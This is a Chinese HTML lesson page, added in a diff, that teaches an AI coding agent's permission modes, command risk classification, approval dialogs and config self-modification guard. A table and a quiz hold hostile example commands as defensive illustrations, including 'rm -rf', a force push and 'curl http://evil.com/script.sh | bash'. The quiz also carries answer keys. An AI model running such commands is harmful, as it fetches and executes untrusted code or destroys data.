@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第 4 课 · 权限审批与配置守卫：三重门禁的最后防线</title>
+<style>
+  body { max-width: 760px; margin: 2rem auto; padding: 0 1.1rem; font-family: system-ui, -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif; line-height: 1.75; color: #1a1a1a; background: #fcfcfc; }
+  h1 { font-size: 1.7rem; margin-top: 0.5rem; line-height: 1.3; }
+  h2 { font-size: 1.25rem; margin-top: 2.3rem; padding-bottom: 0.3rem; border-bottom: 2px solid #f0f0f0; }
+  h3 { font-size: 1.05rem; margin-top: 1.6rem; color: #2c3e50; }
+  code { background: #f0f2f5; padding: 0.1rem 0.4rem; border-radius: 4px; font-size: 0.88em; color: #c0341d; font-family: "SF Mono", Consolas, monospace; }
+  pre { background: #1e2127; color: #e6e6e6; padding: 1rem 1.2rem; border-radius: 8px; overflow-x: auto; font-size: 0.85rem; line-height: 1.6; }
+  pre code { background: none; color: inherit; padding: 0; }
+  .mission { background: linear-gradient(135deg, #f3f8ff, #eef4ff); border: 1px solid #d6e4ff; padding: 0.8rem 1rem; border-radius: 8px; font-size: 0.92rem; margin: 1.2rem 0; }
+  .mission b { color: #1d6fd6; }
+  blockquote { border-left: 3px solid #ddd; margin-left: 0; padding-left: 1rem; color: #555; }
+  .step { background: #fff; border: 1px solid #ebebeb; border-radius: 10px; padding: 0.6rem 1.1rem; margin: 0.7rem 0; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
+  .step .num { display: inline-block; background: #2c3e50; color: #fff; width: 1.6rem; height: 1.6rem; line-height: 1.6rem; text-align: center; border-radius: 50%; font-size: 0.85rem; font-weight: bold; margin-right: 0.5rem; }
+  .step .where { font-size: 0.8rem; color: #888; font-family: "SF Mono", Consolas, monospace; }
+  .side { background: #fffbea; border-left: 3px solid #f0c000; padding: 0.6rem 1rem; border-radius: 0 6px 6px 0; margin: 1.2rem 0; font-size: 0.9rem; }
+  .danger { background: #fff4f4; border-left: 3px solid #e05555; padding: 0.6rem 1rem; border-radius: 0 6px 6px 0; margin: 1.2rem 0; font-size: 0.9rem; }
+  details { background: #f7f9fc; border: 1px solid #e3e8ef; border-radius: 8px; padding: 0.7rem 1rem; margin: 0.8rem 0; }
+  summary { cursor: pointer; font-weight: 600; color: #2c3e50; }
+  details[open] summary { margin-bottom: 0.6rem; }
+  .quiz { background: #fff; border: 1px solid #e3e8ef; border-radius: 8px; padding: 0.5rem 1rem; margin: 0.6rem 0; }
+  .quiz p { font-weight: 600; margin: 0.6rem 0; }
+  .opt { display: block; padding: 0.35rem 0; color: #333; }
+  .cite { font-size: 0.85rem; color: #888; margin-top: 2.5rem; border-top: 1px solid #eee; padding-top: 0.6rem; }
+  .cite a, .reminder a { color: #1d6fd6; }
+  .reminder { background: #f5f5f5; padding: 0.8rem 1rem; border-radius: 6px; margin-top: 1.5rem; font-size: 0.9rem; }
+  .nav { margin-top: 2rem; font-size: 0.88rem; color: #aaa; }
+  .tag { display:inline-block; background:#eef4ff; color:#1d6fd6; font-size:0.72rem; padding:0.1rem 0.5rem; border-radius:4px; vertical-align:middle; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.88rem; margin: 1rem 0; }
+  th, td { border: 1px solid #e3e8ef; padding: 0.5rem 0.7rem; text-align: left; }
+  th { background: #f7f9fc; font-weight: 600; }
+</style>
+</head>
+<body>
+
+<h1>第 4 课 · 权限审批与配置守卫：三重门禁的最后防线 <span class="tag">用户层</span></h1>
+
+<div class="mission">
+&#127919; <b>本节目标：</b>学完你能讲清 HanaAgent 的四种会话权限模式（auto/operate/ask/read_only）如何工作，理解 approval-review-context 的风险展示逻辑，掌握 managed-config-guard 如何防止 Agent 自我篡改配置，以及命令风险分类体系（safe/probe/mutation/dangerous）如何驱动审批决策。
+</div>
+
+<p>PathGuard（Layer 1）做语义判定，OS 沙盒（Layer 2）做进程隔离。但还有一道防线在更上层——<b>用户可见的权限审批与配置守卫</b>。这一层负责回答："这个操作该不该让用户知道？该不该让用户确认？Agent 能不能改自己的安全配置？"</p>
+
+<h2>一、四种会话权限模式</h2>
+
+<p><strong>源码位置：</strong><code>core/session-permission-mode.ts</code>（350 行）</p>
+
+<p>用户在每次会话中可以选择一种权限模式，决定 Agent 的操作需要多少人工审批：</p>
+
+<table>
+<tr><th>模式</th><th>自动执行</th><th>需要审批</th><th>典型场景</th></tr>
+<tr><td><code>auto</code></td><td>所有操作</td><td>无（用户完全信任）</td><td>个人项目、受控环境</td></tr>
+<tr><td><code>operate</code></td><td>读操作 + safe 命令</td><td>写操作 + mutation/dangerous 命令</td><td>日常开发（默认推荐）</td></tr>
+<tr><td><code>ask</code></td><td>读操作</td><td>所有写操作和命令执行</td><td>审查敏感代码、安全要求高</td></tr>
+<tr><td><code>read_only</code></td><td>无</td><td>所有操作（包括读）</td><td>代码审查、学习浏览</td></tr>
+</table>
+
+<div class="step"><span class="num">1</span><b>auto 模式</b>——"完全信任 Agent"。所有操作自动执行，PathGuard 和 OS 沙盒仍然生效，但用户不需要确认任何操作。适合在完全信任的环境中使用。<br><span class="where">session-permission-mode.ts — PermissionMode.Auto</span></div>
+
+<div class="step"><span class="num">2</span><b>operate 模式</b>——"日常开发推荐"。读操作和低风险命令自动执行；写操作、高风险命令（git push --force、rm -rf 等）需要用户确认。这是默认模式。<br><span class="where">session-permission-mode.ts — PermissionMode.Operate</span></div>
+
+<div class="step"><span class="num">3</span><b>ask 模式</b>——"每次都问我"。除了纯读取外，所有操作都弹出审批对话框。适合审查敏感代码或不信任 Agent 建议的场景。<br><span class="where">session-permission-mode.ts — PermissionMode.Ask</span></div>
+
+<div class="step"><span class="num">4</span><b>read_only 模式</b>——"只读模式"。Agent 不能执行任何写入操作、不能运行任何命令。适合纯代码审查和学习浏览。<br><span class="where">session-permission-mode.ts — PermissionMode.ReadOnly</span></div>
+
+<h2>二、命令风险分类体系：四色标记</h2>
+
+<p><strong>源码位置：</strong><code>lib/exec-command/policy.ts</code>（195 行）</p>
+
+<p>每个命令在到达 OS 沙盒之前，先经过风险分类。分类结果决定审批流程和 PathGuard 的严格程度：</p>
+
+<table>
+<tr><th>风险类别</th><th>示例命令</th><th>判定条件</th><th>默认审批</th></tr>
+<tr><td><span style="color:#10b981;">&#9679; safe</span></td><td><code>ls, pwd, cat, echo, git status</code></td><td>纯信息查询，不产生副作用</td><td>operate 模式自动通过</td></tr>
+<tr><td><span style="color:#3b82f6;">&#9679; probe</span></td><td><code>which, type, command -v</code></td><td>环境探测，不修改文件</td><td>operate 模式自动通过</td></tr>
+<tr><td><span style="color:#f59e0b;">&#9679; mutation</span></td><td><code>mkdir, touch, git commit, npm install</code></td><td>有副作用但可逆或低风险</td><td>operate 模式需确认</td></tr>
+<tr><td><span style="color:#e05555;">&#9679; dangerous</span></td><td><code>rm -rf, git push --force, curl | bash</code></td><td>不可逆或高风险操作</td><td>所有模式需确认</td></tr>
+</table>
+
+<pre><code>// exec-command/policy.ts — 风险判定示例逻辑
+function classifyCommand(command: string): RiskLevel {
+  if (matchesPattern(command, DANGEROUS_PATTERNS)) {
+    return 'dangerous';  // rm -rf, force push, curl pipe
+  }
+  if (matchesPattern(command, MUTATION_PATTERNS)) {
+    return 'mutation';   // mkdir, touch, npm install
+  }
+  if (matchesPattern(command, PROBE_PATTERNS)) {
+    return 'probe';      // which, type, command -v
+  }
+  return 'safe';         // ls, pwd, cat, echo
+}</code></pre>
+
+<div class="side">
+&#128161; <b>风险分类的双重作用：</b>风险标签不仅决定审批流程，还作为 <code>approval-review-context</code> 的输入，影响审批对话框中向用户展示的信息量。dangerous 命令会展示完整的命令字符串、影响路径列表和安全提示，而 safe 命令可能只显示一行摘要。
+</div>
+
+<h2>三、Approval Review Context：用户看得见的风险信息</h2>
+
+<p>当审批被触发时，<code>approval-review-context</code> 向用户展示结构化的风险信息，让用户做出知情决策：</p>
+
+<pre><code>// 审批上下文的数据结构
+interface ApprovalReviewContext {
+  command: string;           // 完整命令字符串
+  riskLevel: RiskLevel;      // safe | probe | mutation | dangerous
+  affectedPaths: string[];   // PathGuard 识别出的受影响路径
+  pathAccessLevels: Map&lt;string, AccessLevel&gt;;  // 每个路径的访问级别
+  guardRejections: string[]; // Managed Config Guard 的拦截信息
+  sandboxEnabled: boolean;   // OS 沙盒是否激活
+  networkEnabled: boolean;   // 网络是否可用
+}</code></pre>
+
+<div class="step"><span class="num">&#128269;</span><b>审批对话框展示逻辑：</b><br>
+&#8226; <b>safe/probe 命令：</b>显示一行命令摘要 + 风险标签<br>
+&#8226; <b>mutation 命令：</b>显示命令 + 受影响路径列表 + 每个路径的访问级别<br>
+&#8226; <b>dangerous 命令：</b>显示完整上下文 + 红色警告 + 不可逆操作提示<br>
+<span class="where">从审批上下文推导展示层级</span></div>
+
+<div class="danger">
+&#9888; <b>危险命令的特殊处理：</b>dangerous 级别的命令即使得到用户批准，仍会受到最严格的沙盒限制——PathGuard 额外检查 <code>OP_REQUIREMENTS</code> 映射中的 delete 要求（必须 FULL 级别），OS 沙盒确保 mount/ACL 写保护到位。用户批准只是"确认意图"，不代表绕过安全检查。
+</div>
+
+<h2>四、Managed Config Guard：防止 Agent 自我篡改</h2>
+
+<p><strong>源码位置：</strong><code>lib/sandbox/managed-config-guard.ts</code>（57 行）</p>
+
+<p>这是三层防线中最精细的一道门——专门防止 Agent 通过文件编辑工具修改自身配置：</p>
+
+<pre><code>// managed-config-guard.ts — 核心检查逻辑
+function checkManagedConfigAccess(path: string, operation: string): void {
+  // 匹配模式: hanakoHome/agents/*/config.yaml
+  if (isManagedConfigPath(path)) {
+    throw new ManagedConfigError(
+      `Cannot ${operation} ${path}. ` +
+      `Managed config files must be changed through settings APIs. ` +
+      `Use the settings tool to modify agent configuration.`
+    );
+  }
+}
+
+// 调用于 PathGuard.check() 之后、OS 沙盒执行之前
+// 即使 PathGuard 返回 READ_WRITE，此检查仍会拦截</code></pre>
+
+<div class="step"><span class="num">&#128274;</span><b>为什么需要 Managed Config Guard？</b><br>
+PathGuard 的判定逻辑中，<code>agents/*/config.yaml</code> 可能落在 READ_WRITE 目录的覆盖范围内（如果 agent 工作目录整体标记为可写）。Managed Config Guard 在 PathGuard 判定<b>之后</b>、OS 沙盒执行<b>之前</b>做一次独立检查，确保无论 PathGuard 判定结果如何，config.yaml 都不能被 Agent 直接写入。这防止了 Agent 通过降低安全配置来扩大自身权限。<br><span class="where">lib/sandbox/managed-config-guard.ts</span></div>
+
+<h2>五、三重门禁的协作流程</h2>
+
+<p>以一个实际场景串联三层防线 + 权限审批的完整流程——Agent 尝试执行 <code>rm -rf /workspace/node_modules</code>：</p>
+
+<div class="step"><span class="num">1</span><b>第一重：命令风险分类</b><br>
+<code>classifyCommand("rm -rf /workspace/node_modules")</code> → <b>dangerous</b>（匹配 rm -rf 模式）。审批对话框弹出，展示完整命令和受影响路径。<br><span class="where">exec-command/policy.ts</span></div>
+
+<div class="step"><span class="num">2</span><b>第二重：Managed Config Guard</b><br>
+检查路径 <code>/workspace/node_modules</code> 是否匹配 <code>agents/*/config.yaml</code> → 不匹配，通过。<br><span class="where">managed-config-guard.ts → checkManagedConfigAccess()</span></div>
+
+<div class="step"><span class="num">3</span><b>第三重：PathGuard 判定</b><br>
+<code>_resolveReal("/workspace/node_modules")</code> → 真实路径解析<br>
+<code>getAccessLevel(path)</code> → 级别 9（workspace root 内）→ <b>FULL</b><br>
+<code>check(path, "delete")</code> → FULL >= FULL → <b>通过</b><br><span class="where">path-guard.ts → getAccessLevel() + check()</span></div>
+
+<div class="step"><span class="num">4</span><b>第四重：用户审批（ask 模式）</b><br>
+approval-review-context 展示："危险操作：删除 /workspace/node_modules，共 15342 个文件" → 用户选择"批准"或"拒绝"。<br><span class="where">session-permission-mode.ts → 审批 UI</span></div>
+
+<div class="step"><span class="num">5</span><b>第五重：OS 沙盒执行</b><br>
+用户批准后，命令进入 bwrap/seatbelt/Restricted Token 沙盒执行。此时 workspace 已经被可写挂载（bwrap）或允许写入（ACL/SBPL），命令正常执行。<br><span class="where">bwrap.ts / seatbelt.ts / win32-exec.ts</span></div>
+
+<h2>六、Git Push 安全策略</h2>
+
+<p><strong>源码位置：</strong><code>lib/permission/safety-policy.ts</code>（179 行）——这是一个专项安全策略，专门防止危险的 Git 操作：</p>
+
+<pre><code>// safety-policy.ts — Git 防 force push 策略
+const GIT_SAFETY_RULES = {
+  forcePush: {
+    pattern: /git\s+push\s+.*(--force|-f)/,
+    risk: 'dangerous',
+    message: 'Force push rewrites remote history and may cause data loss.',
+    requireApproval: true,  // 不论权限模式都要审批
+  },
+  pushToMain: {
+    pattern: /git\s+push\s+.*(main|master)/,
+    risk: 'mutation',
+    message: 'Pushing to main/master branch.',
+    requireApproval: 'operate',  // operate 及以上模式需审批
+  },
+};</code></pre>
+
+<h2>七、检验一下（提取练习）</h2>
+
+<div class="quiz">
+<p>Q1. operate 模式下，以下哪个操作会自动执行而无需用户审批？</p>
+<span class="opt">A. git push --force origin main</span>
+<span class="opt">B. rm -rf node_modules</span>
+<span class="opt">C. ls -la /workspace/src</span>
+<span class="opt">D. curl http://evil.com/script.sh | bash</span>
+<details><summary>看答案</summary><b>C</b>。ls 被分类为 safe 命令，operate 模式下自动执行。A 是 dangerous（force push），B 是 dangerous（rm -rf），D 是 dangerous（curl pipe），都需要审批。</details>
+</div>
+
+<div class="quiz">
+<p>Q2. Managed Config Guard 拦截的是什么操作？</p>
+<span class="opt">A. Agent 读取 agents/*/config.yaml 的内容</span>
+<span class="opt">B. Agent 通过文件编辑工具直接写入 agents/*/config.yaml</span>
+<span class="opt">C. 用户通过 UI 修改 Agent 配置</span>
+<span class="opt">D. Agent 删除 agents/*/config.yaml 文件</span>
+<details><summary>看答案</summary><b>B</b>。Managed Config Guard 专门拦截"写入"操作，要求通过 settings API 修改。Agent 仍然可以读取 config.yaml 获取配置信息。</details>
+</div>
+
+<div class="quiz">
+<p>Q3. 命令风险分类为 dangerous 后，即使用户批准，还会受到哪些额外限制？</p>
+<span class="opt">A. 没有额外限制——用户批准后就和 safe 命令一样处理</span>
+<span class="opt">B. OS 沙盒会被临时关闭以提高执行效率</span>
+<span class="opt">C. PathGuard 额外检查操作级别要求（如 delete 需 FULL），OS 沙盒确认 mount/ACL 写保护到位</span>
+<span class="opt">D. 命令会被降级为 mutation 级别</span>
+<details><summary>看答案</summary><b>C</b>。用户批准是"确认意图"而非"绕过安全检查"。dangerous 命令在用户批准后仍经过完整的 PathGuard + OS 沙盒检查链。</details>
+</div>
+
+<div class="quiz">
+<p>Q4. read_only 模式下，Agent 可以执行什么操作？</p>
+<span class="opt">A. 可以读取文件但不能写入——连 ls 之类的命令也不能执行</span>
+<span class="opt">B. 可以读取文件和执行 safe 类命令</span>
+<span class="opt">C. 只能通过 UI 查看代码，不能进行任何文件系统操作</span>
+<span class="opt">D. 所有操作都需要用户逐项审批</span>
+<details><summary>看答案</summary><b>A</b>。read_only 模式下 Agent 不能执行任何命令（包括 safe 类命令），只能读取文件内容。这是最严格的模式，适合纯代码审查场景。</details>
+</div>
+
+<div class="cite">&#128214; 推荐一手资料：通读 <code>core/session-permission-mode.ts</code>（350 行）的四种模式定义，然后对照 <code>lib/exec-command/policy.ts</code>（195 行）中的命令分类正则表达式，理解不同模式下哪些操作会自动执行、哪些需要审批。</div>
+
+<div class="reminder">&#128161; 有疑问？直接问我——我是你的 AI 教师。可以问："如果用户想在 operate 模式下让 npm install 自动执行，应该修改哪个文件的哪个配置？""approval-review-context 的信息量是否过多，会不会导致用户疲劳点击批准？"下一课我们通过 <strong>沙盒逃逸案例分析</strong> 和综合测验检验学习成果。</div>
+
+<div class="nav">上一课：<a href="0003.html">OS 级沙盒实现对比</a> · 课程 0004 / 沙盒架构深度剖析 · 下一课预告：沙盒逃逸案例分析与综合测验</div>
+
+</body>
+</html>
